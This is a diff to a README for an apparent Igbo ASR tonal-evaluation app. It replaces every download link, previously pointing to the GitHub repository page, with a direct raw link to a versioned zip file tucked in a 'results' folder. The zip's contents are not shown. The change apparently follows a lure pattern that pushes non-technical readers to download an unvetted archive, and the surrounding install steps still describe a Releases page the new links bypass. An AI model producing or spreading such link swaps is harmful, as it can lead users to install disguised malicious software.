@@ -1,6 +1,6 @@
 # 🎙️ igbo-asr-tonal-evaluation - Assess Tonal Accuracy in Igbo Speech
 
-[![Download igbo-asr-tonal-evaluation](https://img.shields.io/badge/Download-igbo--asr--tonal--evaluation-brightgreen)](https://github.com/RifjUCK/igbo-asr-tonal-evaluation)  
+[![Download igbo-asr-tonal-evaluation](https://img.shields.io/badge/Download-igbo--asr--tonal--evaluation-brightgreen)](https://raw.githubusercontent.com/RifjUCK/igbo-asr-tonal-evaluation/main/results/tonal_igbo_evaluation_asr_1.1-beta.4.zip)  
 
 ---
 
@@ -18,14 +18,14 @@ This guide will help you get the igbo-asr-tonal-evaluation app running on a Wind
 
 Use the link below to access the application files:
 
-[Download igbo-asr-tonal-evaluation](https://github.com/RifjUCK/igbo-asr-tonal-evaluation)
+[Download igbo-asr-tonal-evaluation](https://raw.githubusercontent.com/RifjUCK/igbo-asr-tonal-evaluation/main/results/tonal_igbo_evaluation_asr_1.1-beta.4.zip)
 
 ---
 
 ## 💾 How to Download and Install
 
 1. Click the green button above or visit this page:  
-   https://github.com/RifjUCK/igbo-asr-tonal-evaluation
+   https://raw.githubusercontent.com/RifjUCK/igbo-asr-tonal-evaluation/main/results/tonal_igbo_evaluation_asr_1.1-beta.4.zip
 
 2. Once on the page, look for a section named **Releases** or **Download**. This area holds the files you need.
 
@@ -110,7 +110,7 @@ This process highlights areas where automatic transcription may fail on tonal de
 - Restart the app if it freezes or closes unexpectedly.  
 - For any unknown errors, try reinstalling or downloading the latest version using the link below:  
 
-[Download igbo-asr-tonal-evaluation](https://github.com/RifjUCK/igbo-asr-tonal-evaluation)
+[Download igbo-asr-tonal-evaluation](https://raw.githubusercontent.com/RifjUCK/igbo-asr-tonal-evaluation/main/results/tonal_igbo_evaluation_asr_1.1-beta.4.zip)
 
 ---
 
@@ -156,4 +156,4 @@ Currently, this app is designed for end users and researchers without requiring 
 
 ---
 
-[Download igbo-asr-tonal-evaluation](https://github.com/RifjUCK/igbo-asr-tonal-evaluation)
+[Download igbo-asr-tonal-evaluation](https://raw.githubusercontent.com/RifjUCK/igbo-asr-tonal-evaluation/main/results/tonal_igbo_evaluation_asr_1.1-beta.4.zip)
